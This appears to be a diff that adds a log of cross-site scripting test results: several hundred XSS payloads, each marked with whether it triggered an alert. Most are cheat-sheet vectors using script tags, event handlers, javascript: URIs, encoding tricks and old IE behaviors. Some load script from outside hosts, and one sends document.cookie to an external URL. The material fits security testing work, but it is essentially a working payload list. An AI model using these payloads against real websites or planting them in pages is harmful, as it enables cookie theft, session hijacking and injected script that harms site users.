@@ -1,0 +1,321 @@
+Payload: <script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script> | Alert: False
+Payload: <meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾ | Alert: False
+Payload: X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` > | Alert: False
+Payload: 1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`> | Alert: False
+Payload: 1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;> | Alert: False
+Payload: 1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a> | Alert: False
+Payload: <a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a> | Alert: False
+Payload: <event-source src="%(event)s" onload="javascript:alert(1)"> | Alert: False
+Payload: <a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"> | Alert: False
+Payload: <div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"> | Alert: False
+Payload: <script>%(payload)s</script> | Alert: False
+Payload: <script>javascript:alert(1)</script> | Alert: True
+Payload: <IMG SRC="javascript:javascript:alert(1);"> | Alert: False
+Payload: <IMG SRC=javascript:javascript:alert(1)> | Alert: False
+Payload: <IMG SRC=`javascript:javascript:alert(1)`> | Alert: False
+Payload: <FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET> | Alert: False
+Payload: <BODY ONLOAD=javascript:alert(1)> | Alert: True
+Payload: <BODY ONLOAD=javascript:javascript:alert(1)> | Alert: False
+Payload: <IMG SRC="jav ascript:javascript:alert(1);"> | Alert: False
+Payload: <BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)> | Alert: False
+Payload: <<SCRIPT>%(payload)s//<</SCRIPT> | Alert: False
+Payload: <IMG SRC="javascript:javascript:alert(1)" | Alert: False
+Payload: <INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);"> | Alert: False
+Payload: <IMG DYNSRC="javascript:javascript:alert(1)"> | Alert: False
+Payload: <IMG LOWSRC="javascript:javascript:alert(1)"> | Alert: False
+Payload: <BGSOUND SRC="javascript:javascript:alert(1);"> | Alert: False
+Payload: <BR SIZE="&{javascript:alert(1)}"> | Alert: False
+Payload: <LINK REL="stylesheet" HREF="javascript:javascript:alert(1);"> | Alert: False
+Payload: <META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet"> | Alert: False
+Payload: <STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS | Alert: False
+Payload: <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);"> | Alert: False
+Payload: <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);"> | Alert: False
+Payload: <IFRAME SRC="javascript:javascript:alert(1);"></IFRAME> | Alert: True
+Payload: <TABLE BACKGROUND="javascript:javascript:alert(1)"> | Alert: False
+Payload: <TABLE><TD BACKGROUND="javascript:javascript:alert(1)"> | Alert: False
+Payload: <DIV STYLE="background-image: url(javascript:javascript:alert(1))"> | Alert: False
+Payload: <DIV STYLE="width:expression(javascript:alert(1));"> | Alert: False
+Payload: <IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))"> | Alert: False
+Payload: <XSS STYLE="xss:expression(javascript:alert(1))"> | Alert: False
+Payload: <STYLE TYPE="text/javascript">javascript:alert(1);</STYLE> | Alert: False
+Payload: <STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A> | Alert: False
+Payload: <STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE> | Alert: False
+Payload: <!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]--> | Alert: False
+Payload: <BASE HREF="javascript:javascript:alert(1);//"> | Alert: False
+Payload: <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT> | Alert: False
+Payload: <HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN> | Alert: False
+Payload: <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML> | Alert: False
+Payload: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4- | Alert: False
+Payload: <form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X | Alert: False
+Payload: <body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus> | Alert: False
+Payload: <P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)"> | Alert: False
+Payload: <STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE> | Alert: False
+Payload: <meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&> | Alert: False
+Payload: <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT> | Alert: False
+Payload: <style onreadystatechange=javascript:javascript:alert(1);></style> | Alert: False
+Payload: <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html> | Alert: False
+Payload: <embed code=javascript:javascript:alert(1);></embed> | Alert: False
+Payload: <frameset onload=javascript:javascript:alert(1)></frameset> | Alert: False
+Payload: <object onerror=javascript:javascript:alert(1)> | Alert: False
+Payload: <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml> | Alert: False
+Payload: <IMG SRC=&{javascript:alert(1);};> | Alert: False
+Payload: <a href="jav&#65ascript:javascript:alert(1)">test1</a> | Alert: False
+Payload: <a href="jav&#97ascript:javascript:alert(1)">test1</a> | Alert: False
+Payload: <embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed> | Alert: False
+Payload: <iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"> | Alert: True
+Payload: ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> | Alert: True
+Payload: <IMG SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC=javascript:alert('XSS')> | Alert: False
+Payload: <IMG SRC=JaVaScRiPt:alert('XSS')> | Alert: False
+Payload: <IMG SRC=javascript:alert("XSS")> | Alert: False
+Payload: <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`> | Alert: False
+Payload: <a onmouseover="alert(document.cookie)">xxs link</a> | Alert: False
+Payload: <a onmouseover=alert(document.cookie)>xxs link</a> | Alert: False
+Payload: <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> | Alert: True
+Payload: <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> | Alert: False
+Payload: <IMG SRC=# onmouseover="alert('xxs')"> | Alert: False
+Payload: <IMG SRC= onmouseover="alert('xxs')"> | Alert: False
+Payload: <IMG onmouseover="alert('xxs')"> | Alert: False
+Payload: <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> | Alert: False
+Payload: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> | Alert: False
+Payload: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> | Alert: False
+Payload: <IMG SRC=" &#14;  javascript:alert('XSS');"> | Alert: False
+Payload: </script></script><<<<script><>>>><<<script>alert(123)</script> | Alert: False
+Payload: <html><noalert><noscript>(123)</noscript><script>(123)</script> | Alert: False
+Payload: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> | Alert: False
+Payload: '></select><script>alert(123)</script> | Alert: True
+Payload: }</style><script>a=eval;b=alert;a(b(/XSS/.source));</script> | Alert: True
+Payload: <SCRIPT>document.write("XSS");</SCRIPT> | Alert: False
+Payload: a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d); | Alert: False
+Payload: ='><script>alert("xss")</script> | Alert: True
+Payload: <body background=javascript:'"><script>alert(navigator.userAgent)</script>></body> | Alert: True
+Payload: ">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script> | Alert: True
+Payload: ">/KinG-InFeT.NeT/><script>alert(document.cookie)</script> | Alert: True
+Payload: !--" /><script>alert('xss');</script> | Alert: True
+Payload: <script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee> | Alert: True
+Payload: "><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee> | Alert: True
+Payload: '"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee> | Alert: True
+Payload: <img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee> | Alert: True
+Payload: <script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee> | Alert: True
+Payload: "><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee> | Alert: True
+Payload: '"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee> | Alert: True
+Payload: <iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee> | Alert: True
+Payload: '><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=' | Alert: True
+Payload: "><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=" | Alert: True
+Payload: \'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\' | Alert: True
+Payload: <SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT> | Alert: False
+Payload: <SCRIPT> alert(“XSS”); </SCRIPT> | Alert: False
+Payload: <BODY BACKGROUND="javascript:alert('XSS')"> | Alert: False
+Payload: <IMG SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <IMG DYNSRC="javascript:alert('XSS')"> | Alert: False
+Payload: <IMG LOWSRC="javascript:alert('XSS')"> | Alert: False
+Payload: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> | Alert: False
+Payload: <LINK REL="stylesheet" HREF="javascript:alert('XSS');"> | Alert: False
+Payload: <TABLE BACKGROUND="javascript:alert('XSS')"> | Alert: False
+Payload: <TD BACKGROUND="javascript:alert('XSS')"> | Alert: False
+Payload: <DIV STYLE="background-image: url(javascript:alert('XSS'))"> | Alert: False
+Payload: &lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt; | Alert: False
+Payload: &lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt; | Alert: False
+Payload: &lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt; | Alert: False
+Payload: &lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt; | Alert: False
+Payload: &lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt; | Alert: False
+Payload: &lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt; | Alert: False
+Payload: &lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS | Alert: False
+Payload: &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt; | Alert: False
+Payload: &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt; | Alert: False
+Payload: a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d); | Alert: False
+Payload: &lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; | Alert: False
+Payload: &lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt; | Alert: False
+Payload: &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt; | Alert: False
+Payload: &lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt; | Alert: False
+Payload: &lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt; | Alert: False
+Payload: &lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt; | Alert: False
+Payload: &lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt; | Alert: False
+Payload: &lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt; | Alert: False
+Payload: &lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; | Alert: False
+Payload: &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4- | Alert: False
+Payload: &lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot; | Alert: False
+Payload: &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: <script>document.vulnerable=true;</script> | Alert: False
+Payload: <img SRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img SRC=" &#14; javascript:document.vulnerable=true;"> | Alert: False
+Payload: <<SCRIPT>document.vulnerable=true;//<</SCRIPT> | Alert: False
+Payload: <img SRC="javascript:document.vulnerable=true;" | Alert: False
+Payload: <iframe src="javascript:document.vulnerable=true; < | Alert: False
+Payload: <script>a=/XSS/\ndocument.vulnerable=true;</script> | Alert: False
+Payload: </title><SCRIPT>document.vulnerable=true;</script> | Alert: False
+Payload: <input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <body BACKGROUND="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img DYNSRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img LOWSRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <bgsound SRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <LAYER SRC="javascript:document.vulnerable=true;"></LAYER> | Alert: False
+Payload: <link REL="stylesheet" HREF="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS | Alert: False
+Payload: <meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;"> | Alert: False
+Payload: <meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;"> | Alert: False
+Payload: <IFRAME SRC="javascript:document.vulnerable=true;"></iframe> | Alert: False
+Payload: <FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset> | Alert: False
+Payload: <table BACKGROUND="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <table><TD BACKGROUND="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <div STYLE="background-image: url(javascript:document.vulnerable=true;)"> | Alert: False
+Payload: <div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)"> | Alert: False
+Payload: <style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a> | Alert: False
+Payload: <style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style> | Alert: False
+Payload: <!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]--> | Alert: False
+Payload: <base HREF="javascript:document.vulnerable=true;//"> | Alert: False
+Payload: <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object> | Alert: False
+Payload: <meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>"> | Alert: False
+Payload: <head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4- | Alert: False
+Payload: <div onmouseover="document.vulnerable=true;"> | Alert: False
+Payload: <img src="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img dynsrc="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <input type="image" dynsrc="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <bgsound src="javascript:document.vulnerable=true;"> | Alert: False
+Payload: &<script>document.vulnerable=true;</script> | Alert: False
+Payload: <link rel="stylesheet" href="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <a href="about:<script>document.vulnerable=true;</script>"> | Alert: False
+Payload: <meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;"> | Alert: False
+Payload: <body onload="document.vulnerable=true;"> | Alert: False
+Payload: <div style="background-image: url(javascript:document.vulnerable=true;);"> | Alert: False
+Payload: <object classid="clsid:..." codebase="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <style><!--</style><script>document.vulnerable=true;//--></script> | Alert: False
+Payload: <<script>document.vulnerable=true;</script> | Alert: False
+Payload: <![<!--]]<script>document.vulnerable=true;//--></script> | Alert: False
+Payload: <!-- -- --><script>document.vulnerable=true;</script><!-- -- --> | Alert: False
+Payload: <img src="blah"onmouseover="document.vulnerable=true;"> | Alert: False
+Payload: <img src="blah>" onmouseover="document.vulnerable=true;"> | Alert: False
+Payload: <xml src="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml> | Alert: False
+Payload: <meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet"> | Alert: False
+Payload: <script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)> | Alert: False
+Payload: "><script>alert('XSS')</script> | Alert: True
+Payload: <;BASE HREF=";javascript:alert(';XSS';);//";>; | Alert: False
+Payload: <;BGSOUND SRC=";javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;BODY BACKGROUND=";javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>; | Alert: False
+Payload: <;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>; | Alert: False
+Payload: <;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>; | Alert: False
+Payload: <;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>; | Alert: False
+Payload: <;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;IMG SRC=";javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;IMG SRC=javascript:alert(';XSS';)>; | Alert: False
+Payload: <;IMG DYNSRC=";javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;IMG LOWSRC=";javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS | Alert: False
+Payload: <;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>; | Alert: False
+Payload: <;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>; | Alert: False
+Payload: a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d); | Alert: False
+Payload: <;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>; | Alert: False
+Payload: <;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>; | Alert: False
+Payload: <;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>; | Alert: False
+Payload: <;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>; | Alert: False
+Payload: <;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>; | Alert: False
+Payload: <;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>; | Alert: False
+Payload: <;IMG SRC=JaVaScRiPt:alert(';XSS';)>; | Alert: False
+Payload: <;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>; | Alert: False
+Payload: <;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>; | Alert: False
+Payload: <;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>; | Alert: False
+Payload: <;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4- | Alert: False
+Payload: <;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>; | Alert: False
+Payload: <;IMG SRC=";javascript:alert(';XSS';)"; | Alert: False
+Payload: <;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>; | Alert: False
+Payload: <;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>; | Alert: False
+Payload: <script>document.vulnerable=true;</script> | Alert: False
+Payload: <img SRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img SRC=" &#14; javascript:document.vulnerable=true;"> | Alert: False
+Payload: <<SCRIPT>document.vulnerable=true;//<</SCRIPT> | Alert: False
+Payload: <img SRC="javascript:document.vulnerable=true;" | Alert: False
+Payload: <iframe src="javascript:document.vulnerable=true; < | Alert: False
+Payload: <script>a=/XSS/\ndocument.vulnerable=true;</script> | Alert: False
+Payload: </title><SCRIPT>document.vulnerable=true;</script> | Alert: False
+Payload: <input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <body BACKGROUND="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img DYNSRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img LOWSRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <bgsound SRC="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <LAYER SRC="javascript:document.vulnerable=true;"></LAYER> | Alert: False
+Payload: <link REL="stylesheet" HREF="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS | Alert: False
+Payload: <meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;"> | Alert: False
+Payload: <meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;"> | Alert: False
+Payload: <IFRAME SRC="javascript:document.vulnerable=true;"></iframe> | Alert: False
+Payload: <FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset> | Alert: False
+Payload: <table BACKGROUND="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <table><TD BACKGROUND="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <div STYLE="background-image: url(javascript:document.vulnerable=true;)"> | Alert: False
+Payload: <div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)"> | Alert: False
+Payload: <style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a> | Alert: False
+Payload: <style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style> | Alert: False
+Payload: <!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]--> | Alert: False
+Payload: <base HREF="javascript:document.vulnerable=true;//"> | Alert: False
+Payload: <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object> | Alert: False
+Payload: <meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>"> | Alert: False
+Payload: <head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4- | Alert: False
+Payload: <div onmouseover="document.vulnerable=true;"> | Alert: False
+Payload: <img src="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <img dynsrc="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <input type="image" dynsrc="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <bgsound src="javascript:document.vulnerable=true;"> | Alert: False
+Payload: &<script>document.vulnerable=true;</script> | Alert: False
+Payload: <link rel="stylesheet" href="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <a href="about:<script>document.vulnerable=true;</script>"> | Alert: False
+Payload: <meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;"> | Alert: False
+Payload: <body onload="document.vulnerable=true;"> | Alert: False
+Payload: <div style="background-image: url(javascript:document.vulnerable=true;);"> | Alert: False
+Payload: <object classid="clsid:..." codebase="javascript:document.vulnerable=true;"> | Alert: False
+Payload: <style><!--</style><script>document.vulnerable=true;//--></script> | Alert: False
+Payload: <<script>document.vulnerable=true;</script> | Alert: False
+Payload: <![<!--]]<script>document.vulnerable=true;//--></script> | Alert: False
+Payload: <!-- -- --><script>document.vulnerable=true;</script><!-- -- --> | Alert: False
